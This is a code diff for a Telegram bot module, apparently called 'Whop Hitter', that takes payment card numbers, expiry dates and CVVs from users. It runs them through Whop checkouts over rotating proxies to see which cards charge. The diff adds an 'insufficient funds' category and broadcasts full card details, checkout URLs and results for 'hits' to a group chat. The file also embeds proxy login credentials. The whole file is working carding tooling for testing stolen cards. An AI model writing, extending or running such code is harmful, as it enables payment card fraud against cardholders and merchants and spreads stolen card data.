@@ -36,8 +36,6 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 # LOCAL IMPORTS — fully defensive so a missing module
 # doesn't take the whole bot down with an ImportError.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-# ── Database (all these exist in database.py) ──
 from database import (
     is_gate_enabled,
     get_db_connection,
@@ -46,23 +44,18 @@ from database import (
     get_premium_status,
 )
 
-# `sub.get_hitter_status` does not exist in this build.
-# `database.get_premium_status` returns (bool, Optional[datetime])
-# which is exactly what the rest of this file expects.
 get_hitter_status = get_premium_status
 
-# ── BIN lookup — try both known locations, then stub ──
 try:
     from bin import get_bin_info
 except ImportError:
     try:
         from tools.binn import get_bin_info
     except ImportError:
-        logging.warning("[whop] get_bin_info not found in 'bin' or 'tools.binn' — using empty stub.")
+        logging.warning("[whop] get_bin_info not found — using empty stub.")
         async def get_bin_info(bin_number):
             return {}
 
-# ── Safe send — fall back to a direct bot.send_message wrapper ──
 try:
     from utils_send import safe_send_message
 except ImportError:
@@ -73,10 +66,8 @@ except ImportError:
         except Exception as e:
             logging.error(f"[whop] safe_send_message fallback failed: {e}")
 
-# ── Whop checkout engine ──
 from gates.whop_hitter import WhopHitter
 
-# Router for this module
 router = Router()
 
 def to_math_bold(s: str) -> str:
@@ -98,14 +89,19 @@ user_last_command_time = {}
 ADMIN_IDS = {6962534443, 8428369446}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BROADCAST — single target group.
-# Receives ONLY: CHARGED hits 💎 and APPROVED (insufficient funds / etc.) ✅
-# Declined / error / unknown results are NOT sent anywhere.
+# BROADCAST — single group.
+# Receives ONLY:
+#   • CHARGED cards 💎     (order placed successfully)
+#   • INSUFFICIENT cards 💰 (insufficient funds)
 #
-# ⚠️ Replace the placeholder with the real group ID (starts with -100).
-#    The bot must be a member with "Send Messages" permission.
+# Full details are sent: header + Whop URL + every field of the
+# standard card result block (CC, gate, response, plan, email, OTP,
+# proxy, BIN info, time, user, dev).
+#
+# Declined / 3DS / incorrect-CVC / errors are NOT broadcast.
+# They appear only in the user's private /whop reply.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-CHARGED_GROUP_CHAT_ID = -1004437051761  # ← REPLACE with your group's chat ID
+CHARGED_GROUP_CHAT_ID = -1004437051761
 
 DEFAULT_ADMIN_PROXIES = [
     "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
@@ -196,12 +192,11 @@ def luhn_check(card_number: str) -> bool:
     return total % 10 == 0
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# COMMAND HANDLER: /whop <url> <cc> OR /whop <cc>
+# COMMAND HANDLER: /whop <url> <cc>
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 @router.message(F.text.regexp(r'^/(?:whop|whophit)(?:\s|$)'))
 async def whop_command(message: types.Message):
-    # 1. GATE CHECK
     if not await asyncio.to_thread(is_gate_enabled, "whop"):
         await message.reply(
             "<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗪𝗵𝗼𝗽 𝗛𝗶𝘁𝘁𝗲𝗿 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>\n"
@@ -214,10 +209,8 @@ async def whop_command(message: types.Message):
     user_id = user.id
     current_time = time.time()
 
-    # 2. GET PREMIUM STATUS
     is_premium, _ = await asyncio.to_thread(get_hitter_status, user_id)
 
-    # 3. RATE LIMITING (free users only)
     if not is_premium and user_id not in ADMIN_IDS:
         if user_id in user_last_command_time:
             elapsed = current_time - user_last_command_time[user_id]
@@ -232,7 +225,6 @@ async def whop_command(message: types.Message):
                 return
         user_last_command_time[user_id] = current_time
 
-    # 4. EXTRACT URL AND CC DETAILS
     full_text = message.text or ""
     if message.reply_to_message:
         full_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")
@@ -270,7 +262,6 @@ async def whop_command(message: types.Message):
     yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
     formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
 
-    # 5. LUHN CHECK
     if not luhn_check(cc):
         await message.reply(
             "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>Invalid Card</b>\n"
@@ -279,14 +270,11 @@ async def whop_command(message: types.Message):
         )
         return
 
-    # 6. GET USER LIVE PROXIES OR FALLBACK TO ADMIN
     user_proxies, is_admin_fallback = await get_user_live_proxies(user_id)
     selected_proxy = random.choice(user_proxies) if user_proxies else None
 
-    # 7. FETCH PLAN NAME
     plan_name = await get_user_plan_name(user_id)
 
-    # 8. SEND PROCESSING MESSAGE
     user_link = f"<a href='tg://user?id={user_id}'>{user.first_name}</a>"
     proc_msg = await message.reply(
         f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>1</code>\n"
@@ -297,7 +285,6 @@ async def whop_command(message: types.Message):
         parse_mode="HTML"
     )
 
-    # 9. LAUNCH ASYNC TASK
     asyncio.create_task(
         process_whop_check(
             message, proc_msg, user, user_id, formatted_cc, cc, mm, yy, cvv,
@@ -320,6 +307,7 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
 
         CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
         CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
+        CUSTOM_INSUFFICIENT_EMOJI_ID = "5039844895779455925"
         CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"
 
         status_raw = "DECLINED"
@@ -355,16 +343,22 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             elapsed = round(time.time() - start_time, 2)
 
         # ── Classification ────────────────────────────────────────
-        # is_charged     → true only for ORDER_PLACED / charged
-        # is_approved    → true for INSUFFICIENT_FUNDS, INCORRECT_CVC, 3DS, etc.
+        # is_charged       → true only for ORDER_PLACED / charged
+        # is_insufficient  → true for INSUFFICIENT_FUNDS specifically
+        # is_approved      → true for other approvals (3DS, incorrect cvc, etc.)
+        #   Only is_charged and is_insufficient get broadcast.
         is_charged = False
+        is_insufficient = False
         is_approved = False
         msg_lower = res_message.lower()
 
         if status_raw == "CHARGED" and ("placed successfully" in msg_lower or "order placed" in msg_lower):
             final_status = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji>'
             is_charged = True
-        elif status_raw in ("APPROVED", "LIVE") or any(k in msg_lower for k in ["insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code"]):
+        elif "insufficient" in msg_lower or "not enough funds" in msg_lower or "no funds" in msg_lower:
+            final_status = f'𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 <tg-emoji emoji-id=\"{CUSTOM_INSUFFICIENT_EMOJI_ID}\">💰</tg-emoji>'
+            is_insufficient = True
+        elif status_raw in ("APPROVED", "LIVE") or any(k in msg_lower for k in ["incorrect cvc", "security code", "3d", "authenticate", "zip code"]):
             final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>'
             is_approved = True
         elif status_raw == "DECLINED" or any(k in msg_lower for k in ["declined", "card_declined", "do_not_honor", "generic_decline", "incomplete", "failed"]):
@@ -455,14 +449,23 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
                     except Exception:
                         pass
 
-        # ── Broadcast — SINGLE group, CHARGED + APPROVED only ──
-        if is_charged or is_approved:
+        # ── Broadcast — SINGLE group, CHARGED + INSUFFICIENT only ──
+        # Full details: header + Whop URL + every field from final_caption
+        if is_charged or is_insufficient:
             if is_charged:
                 header = "<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
             else:
-                header = "<b>✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅</b>"
+                header = "<b>💰 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
 
-            broadcast_text = f"{header}\n━━━━━━━━━━━━━━━━\n{final_caption}"
+            url_line = f"<b>🔗 𝗪𝗵𝗼𝗽 𝗨𝗥𝗟:</b> <code>{html.escape(whop_url)}</code>\n"
+
+            broadcast_text = (
+                f"{header}\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"{url_line}"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"{final_caption}"
+            )
 
             try:
                 await safe_send_message(
